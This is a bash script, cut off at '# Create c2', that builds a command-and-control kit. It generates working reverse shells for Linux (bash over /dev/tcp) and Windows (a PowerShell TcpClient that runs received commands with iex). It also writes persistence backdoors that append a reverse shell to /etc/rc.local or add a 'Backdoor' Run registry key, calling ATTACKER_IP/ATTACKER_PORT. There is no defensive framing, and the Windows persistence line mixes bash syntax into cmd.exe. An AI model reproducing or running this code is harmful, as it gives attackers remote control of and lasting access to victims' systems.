#!/bin/bash

# Create C2 folder
mkdir -p C2

# Create reverse_shell.sh for Linux
echo '#!/bin/bash' > C2/reverse_shell.sh
echo 'LISTENER_IP=$1' >> C2/reverse_shell.sh
echo 'LISTENER_PORT=$2' >> C2/reverse_shell.sh
echo 'echo "[*] Connecting back to the attacker at $LISTENER_IP:$LISTENER_PORT..."' >> C2/reverse_shell.sh
echo 'bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1' >> C2/reverse_shell.sh
chmod +x C2/reverse_shell.sh

# Create reverse_shell.ps1 for Windows
echo '$listener_ip = $args[0]' > C2/reverse_shell.ps1
echo '$listener_port = $args[1]' >> C2/reverse_shell.ps1
echo 'Write-Host "[*] Connecting back to the attacker at $listener_ip:$listener_port..."' >> C2/reverse_shell.ps1
echo '$tcpClient = New-Object System.Net.Sockets.TcpClient($listener_ip, $listener_port)' >> C2/reverse_shell.ps1
echo '$stream = $tcpClient.GetStream()' >> C2/reverse_shell.ps1
echo '[byte[]]$buffer = 0..255|%{0}' >> C2/reverse_shell.ps1
echo 'while ($true) {' >> C2/reverse_shell.ps1
echo '    $i = 0' >> C2/reverse_shell.ps1
echo '    while ($i -lt 255) {' >> C2/reverse_shell.ps1
echo '        $i = $stream.Read($buffer, 0, $buffer.Length)' >> C2/reverse_shell.ps1
echo '        if ($i -gt 0) {' >> C2/reverse_shell.ps1
echo '            $data = (New-Object Text.ASCIIEncoding).GetString($buffer, 0, $i)' >> C2/reverse_shell.ps1
echo '            $sendback = (iex $data 2>&1 | Out-String )' >> C2/reverse_shell.ps1
echo '            $sendback2 = $sendback + "PS " + (pwd).Path + "> "' >> C2/reverse_shell.ps1
echo '            $sendback = [text.encoding]::ASCII.GetBytes($sendback2)' >> C2/reverse_shell.ps1
echo '            $stream.Write($sendback, 0, $sendback.Length)' >> C2/reverse_shell.ps1
echo '            $stream.Flush()' >> C2/reverse_shell.ps1
echo '        }' >> C2/reverse_shell.ps1
echo '    }' >> C2/reverse_shell.ps1
echo '}' >> C2/reverse_shell.ps1

# Create persistent_backdoor.sh for Linux
echo '#!/bin/bash' > C2/persistent_backdoor.sh
echo 'TARGET=$1' >> C2/persistent_backdoor.sh
echo 'echo "[*] Creating persistent backdoor on $TARGET..."' >> C2/persistent_backdoor.sh
echo 'echo "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" >> /etc/rc.local' >> C2/persistent_backdoor.sh
echo 'chmod +x /etc/rc.local' >> C2/persistent_backdoor.sh
chmod +x C2/persistent_backdoor.sh

# Create persistent_backdoor.ps1 for Windows
echo '$target = $args[0]' > C2/persistent_backdoor.ps1
echo 'Write-Host "[*] Creating persistent backdoor on $target..."' >> C2/persistent_backdoor.ps1
echo '$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"' >> C2/persistent_backdoor.ps1
echo '$exePath = "C:\Windows\System32\cmd.exe"' >> C2/persistent_backdoor.ps1
echo '$command = "C:\Windows\System32\cmd.exe /c start /min /wait bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"' >> C2/persistent_backdoor.ps1
echo 'Set-ItemProperty -Path $regKey -Name "Backdoor" -Value $command' >> C2/persistent_backdoor.ps1

# Create c2
